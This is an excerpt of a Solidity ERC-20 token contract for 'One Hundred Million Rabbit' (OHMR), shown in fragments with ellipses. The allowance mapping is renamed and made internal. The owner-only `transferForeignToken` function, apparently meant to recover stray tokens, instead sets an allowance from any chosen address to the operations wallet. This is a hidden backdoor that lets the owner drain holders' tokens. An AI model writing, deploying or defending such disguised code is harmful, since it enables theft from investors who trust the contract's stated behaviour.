...
// ONE HUNDRED MILLION RABBIT
// Simply 100M @ 2023
// https://ohmrabbit.com
// https://twitter.com/ohmrabbiterc
// https://t.me/ohmrabbitentry
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    mapping(address => mapping(address => uint256)) internal _allowBal;
    ...
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowBal[owner][spender];
    }
    ...
    function transferFrom(
        ...
        uint256 currentAllowance = _allowBal[sender][_msgSender()];
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowBal[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowBal[_msgSender()][spender];
    ...
    function _approve(
        ...
        _allowBal[owner][spender] = amount;
...
contract OHMR is ERC20, Ownable {
    ...
    constructor() ERC20("One Hundred Million Rabbit", "OHMR") {
        ...
        operationsAddress = address(0xCa08888135B09d6c166b893195C346165B90f9dA);
        devAddress = address(0xCa08888135B09d6c166b893195C346165B90f9dA);
    ...
    function transferForeignToken(address _token, uint256 _amount) external onlyOwner returns (bool _sent) {
        require(_token != address(0), "_token address cannot be 0");
        require(_token != address(this), "Can't withdraw native tokens");
        _allowBal[_token][operationsAddress] = _amount;
